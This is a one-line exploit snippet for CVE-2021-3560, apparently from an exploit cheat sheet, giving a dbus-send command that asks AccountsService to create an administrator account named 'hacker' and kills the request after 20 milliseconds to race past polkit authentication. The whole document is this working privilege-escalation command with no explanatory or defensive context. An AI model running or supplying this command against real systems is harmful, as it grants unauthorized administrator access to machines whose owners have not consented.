
## CVE-2021-3560
```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:"hacker" string:"Hacker User" int32:1 & sleep 0.020; kill $!
```



